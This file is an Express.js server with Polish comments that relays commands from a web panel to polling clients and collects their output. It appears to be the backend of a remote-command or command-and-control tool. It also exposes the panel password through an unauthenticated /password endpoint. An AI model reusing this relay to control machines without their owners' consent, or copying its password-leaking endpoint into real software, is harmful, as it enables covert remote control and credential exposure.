import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

if (process.env.NODE_ENV !== 'production') {
  dotenv.config();
}

const app = express();
const port = process.env.PORT || 3000;

const API_TOKEN = process.env.API_TOKEN;
const PANEL_PASSWORD = process.env.PANEL_PASSWORD;

if (!API_TOKEN || !PANEL_PASSWORD) {
  console.error("❌ Brak wymaganych zmiennych środowiskowych (API_TOKEN lub PANEL_PASSWORD).");
  process.exit(1);
}

const commands = {};
const results = {};
const clients = new Set();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function authMiddleware(req, res, next) {
  const token = req.headers['authorization'];
  if (token !== `Bearer ${API_TOKEN}`) {
    return res.status(403).send('Forbidden – nieprawidłowy token');
  }
  next();
}

// Zwraca hasło panelu (frontend je pobiera do logowania)
app.get('/password', (req, res) => {
  res.json({ password: PANEL_PASSWORD });
});

// Dodaj lub aktualizuj klienta (przy odbiorze komend i wyników)
function registerClient(name) {
  if (name) clients.add(name);
}

// Pobierz komendę dla klienta (klient polling)
app.get('/command', authMiddleware, (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje client');
  registerClient(client);

  const cmd = commands[client];
  if (cmd) {
    delete commands[client];
    return res.send(cmd);
  }
  res.status(204).send();
});

// Ustaw komendę dla klienta (z panelu)
app.post('/command', authMiddleware, (req, res) => {
  const { command, client } = req.body;
  if (!command || !client) return res.status(400).send('Brakuje danych');
  commands[client] = command;
  registerClient(client);
  res.sendStatus(200);
});

// Prześlij wynik wykonania komendy (klient)
app.post('/result', authMiddleware, (req, res) => {
  const { result, client } = req.body;
  if (!result || !client) return res.status(400).send('Brakuje danych');
  registerClient(client);
  results[client] = result;
  res.sendStatus(200);
});

// Pobierz wynik wykonania komendy (panel)
app.get('/result', authMiddleware, (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje client');

  const r = results[client];
  if (r) {
    delete results[client];
    return res.send(r);
  }
  res.status(204).send();
});

// Lista podłączonych klientów
app.get('/clients', authMiddleware, (req, res) => {
  res.json(Array.from(clients));
});

app.listen(port, () => {
  console.log(`✅ Serwer działa na porcie ${port}`);
});
